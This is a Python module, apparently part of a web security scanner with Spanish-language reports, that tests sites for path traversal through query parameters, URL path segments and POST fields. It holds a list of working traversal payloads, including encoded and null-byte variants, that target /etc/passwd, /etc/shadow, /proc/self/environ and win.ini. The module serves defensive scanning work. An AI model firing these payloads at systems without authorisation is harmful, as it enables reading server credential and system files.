from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging
from scanner.http_client import HttpClient


logger = logging.getLogger(__name__)


PATH_PARAM_HINTS = [
    "file", "path", "download", "document", "doc", "template",
    "name", "filename", "page", "view", "include", "load",
    "read", "fetch", "data", "src", "source", "resource"
]

_LINUX = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../etc/shadow", "../proc/self/environ",
    "../etc/hosts", "..%2Fetc%2Fpasswd", "..%2F..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd", "../etc/passwd%00", "../etc/passwd%00.jpg",
    "....//....//etc/passwd", ".././.././etc/passwd", "%c0%ae%c0%ae/etc/passwd",
]
_WINDOWS = [
    "..\\..\\windows\\win.ini", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5C..%5Cwindows%5Cwin.ini", "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "....\\\\....\\\\windows\\win.ini", "C:\\Windows\\win.ini", "C:/Windows/win.ini",
]
TRAVERSAL_PAYLOADS = _LINUX + _WINDOWS

SIGNATURES = [
    "root:x:0:0", "root:*:", "/bin/bash", "/bin/sh", "daemon:x:", "nobody:x:",
    "127.0.0.1", "localhost", "PATH=",
    "[fonts]", "[extensions]", "[Mail]", "[MCI Extensions", "for 16-bit app support",
]


def _build_segment_traversal_urls(page_url):
    candidates = []
    parsed = urlparse(page_url)
    segments = [s for s in parsed.path.strip("/").split("/") if s]
    if len(segments) < 2:
        return candidates
    for depth in (1, 2):
        if depth > len(segments):
            continue
        prefix_segs = segments[:-depth]
        prefix_path = "/" + "/".join(prefix_segs) + "/" if prefix_segs else "/"
        for payload in TRAVERSAL_PAYLOADS[:10]:
            mutated_path = prefix_path + payload
            test_url = urlunparse(parsed._replace(path=mutated_path, query=""))
            candidates.append((test_url, payload))
    return candidates


def _probe(client, url_or_none, payload, param_label):
    if not url_or_none:
        return None
    try:
        response = client.get(url_or_none)
        body = response.text or ""
        matched = [sig for sig in SIGNATURES if sig in body]
        if matched:
            return {
                "control": f"Path Traversal: {param_label}",
                "status": "Hallazgo",
                "severity": "Critica",
                "description": "Se confirmo lectura de archivo del sistema mediante path traversal.",
                "evidence": f"URL: {url_or_none} | Payload: {payload} | Firmas: {', '.join(matched[:3])}",
                "recommendation": (
                    "Normalizar rutas con os.path.realpath(), aplicar allowlist de rutas permitidas, "
                    "aislar directorios accesibles y rechazar cualquier acceso fuera del directorio base."
                ),
            }
    except Exception:
        logger.debug("Fallo en _probe de path traversal", exc_info=True)
    return None


def scan_path_traversal(pages):
    client = HttpClient()
    results = []
    seen = set()

    for page in pages:
        page_url = page.get("url") or page.get("final_url") or ""
        if not page_url:
            continue
        parsed = urlparse(page_url)
        params = parse_qs(parsed.query)

        # 1. Query-parameter traversal
        for param in list(params.keys()):
            if param.lower() not in PATH_PARAM_HINTS:
                continue
            for payload in TRAVERSAL_PAYLOADS:
                mutated = params.copy()
                mutated[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
                key = ("qparam", param, payload[:30])
                if key in seen:
                    continue
                seen.add(key)
                res = _probe(client, test_url, payload, f"{param} (GET)")
                if res:
                    results.append(res)
                    break

        # 2. URL path-segment traversal (REST endpoints)
        for test_url, payload in _build_segment_traversal_urls(page_url):
            key = ("seg", test_url[:80])
            if key in seen:
                continue
            seen.add(key)
            res = _probe(client, test_url, payload, "path segment (URL)")
            if res:
                results.append(res)

        # 3. POST form fields containing file/path parameters
        for form in (page.get("forms") or []):
            if not isinstance(form, dict):
                continue
            for field in form.get("fields", []):
                fname = str(field.get("name", "")).lower()
                if fname not in PATH_PARAM_HINTS:
                    continue
                for payload in TRAVERSAL_PAYLOADS[:8]:
                    data = {f["name"]: f.get("value", "") for f in form.get("fields", []) if f.get("name")}
                    data[field["name"]] = payload
                    try:
                        response = client.post(form.get("action") or page_url, data=data)
                        body = response.text or ""
                        matched = [sig for sig in SIGNATURES if sig in body]
                        if matched:
                            results.append({
                                "control": f"Path Traversal POST: {field['name']}",
                                "status": "Hallazgo",
                                "severity": "Critica",
                                "description": "Lectura de archivo local detectada via POST.",
                                "evidence": f"URL: {form.get('action')} | Campo: {field['name']} | Payload: {payload} | Firmas: {', '.join(matched[:3])}",
                                "recommendation": "Normalizar rutas, aplicar allowlist y evitar acceso directo basado en parametros de usuario.",
                            })
                            break
                    except Exception:
                        logger.debug("Fallo en prueba path traversal POST", exc_info=True)

    if not results:
        results.append({
            "control": "Path Traversal",
            "status": "No evidenciado",
            "severity": "Informativa",
            "description": (
                "No se detectaron indicios de path traversal en parametros GET, "
                "segmentos de ruta REST ni campos POST analizados."
            ),
            "evidence": "Sin firmas de archivos locales.",
            "recommendation": "Complementar con endpoints autenticados de descarga o generacion documental.",
        })

    return results
